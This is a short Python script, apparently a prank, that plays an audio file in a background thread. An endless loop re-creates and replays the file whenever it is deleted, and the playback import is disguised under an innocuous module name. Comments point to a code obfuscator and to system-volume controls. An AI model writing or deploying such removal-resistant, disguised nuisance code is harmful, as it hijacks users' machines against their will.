from data_extract import playsound
from threading import Thread
from os.path import exists

loc = "data1.wav"

dataFile = open("data.bin", "rb")
data = dataFile.read()
dataFile.close()

data1 = open(loc, "wb")
data1.write(data)
data1.close()

dataThread = Thread(target = playsound, args = [loc])
dataThread.start()

while True:
    if not exists(loc):
        data1 = open(loc, "wb")
        data1.write(data)
        data1.close()

        dataThread = Thread(target = playsound, args = [loc])
        dataThread.start()

# https://development-tools.net/python-obfuscator/

# Windows - https://github.com/AndreMiras/pycaw
# Above from https://stackoverflow.com/questions/20828752/python-change-master-application-volume
# Mac - https://stackoverflow.com/questions/2565204/adjust-osx-system-audio-volume-in-python